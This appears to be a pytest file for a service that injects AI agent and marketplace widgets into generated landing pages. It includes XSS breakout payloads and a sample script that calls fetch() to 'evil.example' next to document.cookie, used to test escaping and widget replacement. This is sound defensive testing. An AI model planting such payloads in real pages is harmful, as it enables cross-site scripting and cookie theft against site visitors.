"""Tests for optional Agent-To-Website and AIMarket widget embeds."""

from pathlib import Path

from web.backend.services import landing_embeds as le


def test_agent_widget_injected_for_marketing_landing():
    html = "<!doctype html><html><body><h1>Hi</h1></body></html>"
    product = {
        "id": "prod-test123",
        "idea": "AI billing assistant",
        "delivery_profile": "marketing_landing",
        "agent_to_website": True,
        "content_locale": "en",
    }
    out = le.apply_embeds_to_html(html, product)
    assert 'id="aicom-agent"' in out
    assert "AI billing assistant" in out or "this offer" in out


def test_agent_skipped_when_disabled():
    html = "<html><body></body></html>"
    product = {
        "id": "prod-x",
        "delivery_profile": "marketing_landing",
        "agent_to_website": False,
    }
    assert le.apply_embeds_to_html(html, product) == html


def test_aimarket_widget_for_full_software():
    html = "<html><body><main>App</main></body></html>"
    product = {
        "id": "prod-full99",
        "idea": "Team wiki with AI search",
        "delivery_profile": "full_software",
        "aimarket_widget": True,
    }
    out = le.apply_embeds_to_html(html, product)
    assert le.AIMARKET_MARKER in out
    assert "aimarket.js" in out
    assert 'data-affiliate-id="prod-full99"' in out
    assert "Team wiki with AI search" in out


def test_aimarket_not_on_marketing_landing():
    html = "<html><body></body></html>"
    product = {
        "id": "prod-land1",
        "delivery_profile": "marketing_landing",
        "aimarket_widget": True,
    }
    assert le.apply_embeds_to_html(html, product) == html


def test_agent_widget_no_script_breakout():
    """A malicious idea/locale must not break out of the inline <script>."""
    payload = "Idea </script><img src=x onerror=alert(document.domain)>"
    html = "<!doctype html><html><body><h1>Hi</h1></body></html>"
    product = {
        "id": "prod-evil1",
        "idea": payload,
        "admin_instructions": "</script><script>alert(2)</script>",
        "delivery_profile": "marketing_landing",
        "agent_to_website": True,
        "content_locale": "</script><b>",
    }
    out = le.apply_embeds_to_html(html, product)
    # The audited widget opens exactly one <script>; the injected user data must
    # not introduce any extra/closing script tag or raw HTML tag. (onerror= as
    # plain text inside a JS string is harmless — what matters is no real tag.)
    assert out.count("<script>") == 1
    assert out.count("</script>") == 1
    assert "<img" not in out
    assert "<b>" not in out
    assert "</script><script>" not in out
    assert "\\u003c/script\\u003e" in out  # payload survives, but escaped


def test_strip_removes_whole_nested_widget():
    """strip_agent_widget must cut the full subtree, not stop at first </div>."""
    widget = (
        '<div id="aicom-agent" class="aicom-agent">'
        "<style>.x{}</style>"
        '<div class="panel"><div class="head">h</div><div class="body">b</div></div>'
        '<script>var x=1;</script>'
        "</div>"
    )
    content = f"<body>BEFORE{widget}AFTER</body>"
    out = le.strip_agent_widget(content)
    assert out == "<body>BEFOREAFTER</body>"
    assert "aicom-agent" not in out
    assert "<script>" not in out


def test_strict_replaces_risky_model_widget():
    """A model-supplied widget with risky JS is replaced by the audited one."""
    risky = (
        '<div id="aicom-agent"><script>fetch("https://evil.example/x")'
        ";document.cookie</script></div>"
    )
    html = f"<html><body>{risky}</body></html>"
    out = le.ensure_agent_widget(html, enabled=True, user_prompt="hi", locale="en")
    assert "evil.example" not in out
    assert "document.cookie" not in out
    assert out.count('id="aicom-agent"') == 1


def test_inject_on_disk(tmp_path):
    root = tmp_path / "data"
    pid = "prod-embed1"
    html_path = root / "code" / pid / "index.html"
    html_path.parent.mkdir(parents=True)
    html_path.write_text("<html><body></body></html>", encoding="utf-8")
    product = {
        "id": pid,
        "idea": "Demo SaaS",
        "delivery_profile": "marketing_landing",
        "agent_to_website": True,
    }
    le.inject_landing_embeds_for_product(root, pid, product)
    out = html_path.read_text(encoding="utf-8")
    assert 'id="aicom-agent"' in out
    le.inject_landing_embeds_for_product(root, pid, product)
    assert out == html_path.read_text(encoding="utf-8")
